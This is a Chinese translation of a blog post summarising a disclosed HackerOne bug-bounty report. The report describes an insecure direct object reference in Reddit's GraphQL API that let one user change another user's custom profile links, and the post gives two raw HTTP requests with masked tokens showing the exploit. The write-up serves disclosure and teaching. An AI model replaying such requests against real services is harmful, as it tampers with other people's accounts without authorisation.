# 这些 IDOR 漏洞如何获得 5000 美元| Hackerone Reddit Bug 赏金

> 原文：<https://infosecwriteups.com/how-these-idor-vulnerability-earned-5000-hackerone-reddit-bug-bounty-c685fcfbd8bc?source=collection_archive---------3----------------------->

## 修改任何用户自定义简档链接

![](img/ad3346443016dd87e7ea6024f2cd92ab.png)

由[布雷特·乔丹](https://www.pexels.com/@brettjordan/)在[像素](https://www.pexels.com/photo/red-white-and-black-labeled-box-5437588/)上拍摄的照片

IDOR，不安全的直接对象引用是一个广泛但潜在的严重漏洞。当应用程序没有正确验证用户输入时，就会出现这种类型的漏洞。攻击者可以利用此漏洞访问未经授权的资源或执行未经授权的操作。

在这篇文章中，我将解释一份由用户报告的关于 HackerOne 的公开报告`criptex`。这份报告可以在[这里](https://hackerone.com/reports/1661113)找到

# 特征

reddit 用户可以向他们的 Reddit 个人资料添加自定义链接或社交媒体个人资料链接，并重定向其他用户。

# 利用

配置文件上的自定义链接可能会被以下易受攻击的请求更改。

```
POST / HTTP/2
Host: gql.reddit.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20000101 Firefox/101.0
Accept: */*
Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 173
X-Reddit-Loid: * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
X-Reddit-Session: * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
X-Reddit-Compression: 1
Origin: https://www.reddit.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Authorization: Bearer * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
Referer: https://www.reddit.com/
Te: trailers

{"id":"c558e604581f","variables":{"input":{"socialLinks":[{"outboundUrl":"https://www.hackerone.com","title":"hacker","type":"CUSTOM","id":"* * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *"}]}}}
```

他可以通过更改请求中的后一个 id 参数来更改任何 reddit 用户的个人资料链接。他使用下面的请求来获取其他用户配置文件上的自定义链接 id。

```
POST / HTTP/2
Host: gql.reddit.com
Content-Length: 62
Sec-Ch-Ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"
X-Reddit-Loid:  * * ** * * * * * * * * * * ** * *  * * * * * * * * *  * * * * *  *
Sec-Ch-Ua-Mobile: ?0
Authorization: Bearer * * * * * * *  * * * * * * * * * * * * * * * * * * * * * * * * *  * * * * *  *
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/531.36
X-Reddit-Compression: 1
X-Reddit-Session:  * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Origin: https://www.reddit.com
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.reddit.com/
Accept-Encoding: gzip, deflate
Accept-Language: es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7,bs;q=0.6,ja;q=0.5

{"id":"11a239b07f86","variables":{"username":"*********"}}
```

# 结论

由于这可能会对 Reddit 用户的形象造成一些负面影响，黑客`criptex`获得了应得的 5000 美元奖金。

## 来自 Infosec 的报道:Infosec 每天都有很多内容，很难跟上。[加入我们的每周简讯](https://weekly.infosecwriteups.com/)以 5 篇文章、4 个线程、3 个视频、2 个 GitHub Repos 和工具以及 1 个工作提醒的形式免费获取所有最新的 Infosec 趋势！